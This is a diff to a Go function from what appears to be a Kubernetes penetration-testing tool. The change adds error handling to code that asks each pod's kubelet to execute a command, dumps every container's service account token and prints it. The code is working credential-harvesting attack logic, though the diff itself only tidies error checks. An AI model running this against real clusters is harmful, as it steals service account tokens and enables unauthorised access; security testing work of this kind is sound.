@@ -59,7 +59,10 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo, serviceAccounts *[]Servic
 					var output []PodNamespaceContainerTuple
 					var podDetails PodDetails
 
-					json.Unmarshal([]byte(runningPodsBody), &podDetails)
+					err = json.Unmarshal([]byte(runningPodsBody), &podDetails)
+					if err != nil {
+						println("[-] Error unmarshaling data in this secret: ", err)
+					}
 
 					for _, item := range podDetails.Items {
 						podName := item.Metadata.Name
@@ -88,13 +91,16 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo, serviceAccounts *[]Servic
 								println("===============================================================================================")
 								println("Asking Kubelet to dump service account token via URL:", urlExecPod)
 								println("")
-								reqExecPod, _ := http.NewRequest("POST", urlExecPod, strings.NewReader(data.Encode()))
+								reqExecPod, err := http.NewRequest("POST", urlExecPod, strings.NewReader(data.Encode()))
+								if err != nil {
+									println("[-] Error with request: ", err)
+								}
 								reqExecPod.Header.Add("Content-Type", "application/x-www-form-urlencoded")
 								reqExecPod.Header.Add("Content-Length", strconv.Itoa(len(data.Encode())))
 								respExecPod, err := sslClient.Do(reqExecPod)
 								if err != nil {
 									fmt.Printf("[-] Error - could not perform request --%s-- - %s\n", urlExecPod, err.Error())
-									respExecPod.Body.Close()
+									//respExecPod.Body.Close() // do we defer here?
 									continue
 								}
 								if respExecPod.Status != "200 OK" {
@@ -102,7 +108,10 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo, serviceAccounts *[]Servic
 									continue
 								}
 								defer respExecPod.Body.Close()
-								bodyExecCommand, _ := ioutil.ReadAll(respExecPod.Body)
+								bodyExecCommand, err := ioutil.ReadAll(respExecPod.Body)
+								if err != nil {
+									println("[-] Error reading data: ", err)
+								}
 								token := string(bodyExecCommand)
 								println("[+] Got service account token for", "ns:"+podNamespace+" pod:"+podName+" container:"+containerName+":", token)
 								println("")
